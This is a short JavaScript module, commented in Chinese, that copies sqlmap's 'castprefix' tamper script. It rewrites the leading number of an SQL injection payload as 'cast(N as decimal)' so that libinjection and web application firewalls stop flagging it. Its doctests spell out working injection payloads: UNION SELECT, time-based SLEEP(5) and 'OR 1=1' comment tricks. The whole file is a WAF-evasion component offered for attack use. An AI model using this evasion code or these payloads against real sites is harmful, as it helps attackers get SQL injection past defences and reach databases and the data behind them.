// 对标 sqlmap castprefix.py：将前导数字转为 CAST(N AS DECIMAL)
// 使 libinjection/WAF 不再将 payload 识别为数据库指纹（清除数字前导异常分）
export const castprefix = {
  name: 'castprefix',
  description: '将前导数字字面量转为 cast(N as decimal)（清除 libinjection 数字指纹，对齐 sqlmap）',
  doctests: [
    { input: '-1 UNION ALL SELECT NULL,NULL-- -', output: 'cast(-1 as decimal) UNION ALL SELECT NULL,NULL-- -' },
    { input: '1 AND SLEEP(5)', output: 'cast(1 as decimal) AND SLEEP(5)' },
    { input: '-4162 OR 1=1#', output: 'cast(-4162 as decimal) OR 1=1#' },
    { input: "' OR 1=1-- -", output: "' OR 1=1-- -" }, // 引号开头不处理
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    const s = String(payload ?? '');
    if (!s) return s;
    return s.replace(/^([+-]?\d+)(?![\w.])/, 'cast($1 as decimal)');
  },
};
export default castprefix;
